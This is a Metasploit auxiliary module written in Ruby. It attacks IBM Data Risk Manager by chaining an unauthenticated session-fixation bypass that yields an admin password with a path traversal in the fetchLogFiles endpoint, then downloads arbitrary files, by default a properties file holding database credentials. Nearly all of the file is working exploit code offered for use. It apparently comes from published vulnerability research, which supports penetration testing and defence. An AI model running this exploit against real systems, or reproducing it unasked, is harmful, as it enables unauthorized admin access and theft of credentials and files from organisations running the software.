##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'IBM Data Risk Manager Arbitrary File Download',
        'Description' => %q{
          IBM Data Risk Manager (IDRM) contains two vulnerabilities that can be chained by
          an unauthenticated attacker to download arbitrary files off the system.
          The first is an unauthenticated bypass, followed by a path traversal.
          This module exploits both vulnerabilities, giving an attacker the ability to download (non-root) files.
          A downloaded file is zipped, and this module also unzips it before storing it in the database.
          By default this module downloads Tomcat's application.properties files, which contains the
          database password, amongst other sensitive data.
          At the time of disclosure, this is was a 0 day, but IBM later patched it and released their advisory.
          Versions 2.0.2 to 2.0.4 are vulnerable, version 2.0.1 is not.
        },
        'Author' => [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and Metasploit module
        ],
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'SSL' => true
        },
        'References' => [
          [ 'CVE', '2020-4427' ], # auth bypass
          [ 'CVE', '2020-4429' ], # insecure default password
          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2020/Apr/33' ],
          [ 'URL', 'https://www.ibm.com/blogs/psirt/security-bulletin-vulnerabilities-exist-in-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430/']
        ],
        'DisclosureDate' => '2020-04-21',
        'Actions' => [
          ['Download', { 'Description' => 'Download arbitrary file' }]
        ],
        'DefaultAction' => 'Download'
      )
    )

    register_options(
      [
        Opt::RPORT(8443),
        OptString.new('TARGETURI', [ true, 'Default server path', '/']),
        OptString.new('FILEPATH', [
          false, 'Path of the file to download',
          '/home/a3user/Tomcat/webapps/albatross/WEB-INF/classes/application.properties'
        ])
      ]
    )
  end

  def check
    # at the moment there is no better way to detect AND be stealthy about it
    session_id = Rex::Text.rand_text_alpha(5..12)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'albatross', 'saml', 'idpSelection'),
      'method' => 'GET',
      'vars_get' => {
        'id' => session_id,
        'userName' => 'admin'
      }
    })
    if res && (res.code == 302)
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Unknown
  end

  def create_session_id
    # step 1: create a session ID and try to make it stick
    session_id = Rex::Text.rand_text_alpha(5..12)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'albatross', 'saml', 'idpSelection'),
      'method' => 'GET',
      'vars_get' => {
        'id' => session_id,
        'userName' => 'admin'
      }
    })
    if res && (res.code != 302)
      fail_with(Failure::Unknown, "#{peer} - Failed to \"stick\" session ID")
    end

    print_good("#{peer} - Successfully \"stickied\" our session ID #{session_id}")

    session_id
  end

  def free_the_admin(session_id)
    # step 2: give the session ID to the server and have it grant us a free admin password
    post_data = Rex::MIME::Message.new
    post_data.add_part('', nil, nil, 'form-data; name="deviceid"')
    post_data.add_part(Rex::Text.rand_text_alpha(8..15), nil, nil, 'form-data; name="password"')
    post_data.add_part('admin', nil, nil, 'form-data; name="username"')
    post_data.add_part('', nil, nil, 'form-data; name="clientDetails"')
    post_data.add_part(session_id, nil, nil, 'form-data; name="sessionId"')

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'albatross', 'user', 'login'),
      'method' => 'POST',
      'data' => post_data.to_s,
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
    })

    unless res && (res.code == 200) && res.body[/"data":"([0-9a-f\-]{36})/]
      fail_with(Failure::NoAccess, "#{peer} - Failed to obtain the admin password.")
    end

    password = Regexp.last_match(1)
    print_good("#{peer} - We have obtained a new admin password #{password}")

    password
  end

  def login_and_csrf(password)
    # step 3: login and get an authenticated cookie
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'login'),
      'method' => 'POST',
      'vars_post' => {
        'userName' => 'admin',
        'password' => password
      }
    })
    unless res && (res.code == 302) && res.get_cookies
      fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate as an admin.")
    end

    print_good("#{peer} - ... and are authenticated as an admin!")
    cookie = res.get_cookies
    url = res.redirection.to_s

    # step 4: obtain CSRF header in order to be able to make valid requests
    res = send_request_cgi({
      'uri' => url,
      'method' => 'GET',
      'cookie' => cookie
    })

    unless res && (res.code == 200) && res.body =~ /var csrfToken = "([0-9a-f\-]{36})";/
      fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate obtain CSRF cookie.")
    end
    csrf = Regexp.last_match(1)

    return cookie, csrf
  end

  def run
    # step 1: create a session ID and try to make it stick
    session_id = create_session_id

    # step 2: give the session ID to the server and have it grant us a free admin password
    password = free_the_admin(session_id)

    # step 3: login and get an authenticated cookie
    # step 4: obtain CSRF header in order to be able to make valid requests
    cookie, csrf = login_and_csrf(password)

    # step 5: download the file!
    post_data = {
      'instanceId' => 'local_host',
      'logLevel' => 'DEBUG',
      'logFileNameList' => "../../../../..#{datastore['FILEPATH']}"
    }.to_json

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'albatross', 'eurekaservice', 'fetchLogFiles'),
      'method' => 'POST',
      'cookie' => cookie,
      'headers' => { 'CSRF-TOKEN' => csrf },
      'data' => post_data.to_s,
      'ctype' => 'text/json'
    })

    unless res && (res.code == 200) && !res.body.empty?
      fail_with(Failure::Unknown, "#{peer} - Failed to download file #{datastore['FILEPATH']}")
    end

    Zip::File.open_buffer(res.body) do |zipfile|
      # Not sure what happens if we receive garbage that's not a ZIP file, but that shouldn't
      # happen? Either we get nothing or a proper zip file.
      file = zipfile.find_entry(File.basename(datastore['FILEPATH']))
      unless file
        fail_with(Failure::Unknown, "#{peer} - Incorrect file downloaded!")
      end

      filedata = zipfile.read(file)
      vprint_line(filedata.to_s)
      fname = File.basename(datastore['FILEPATH'])

      path = store_loot(
        'IBM_DRM.http',
        'application/octet-stream',
        rhost,
        filedata,
        fname
      )
      print_good("File saved in: #{path}")
    end
  end
end
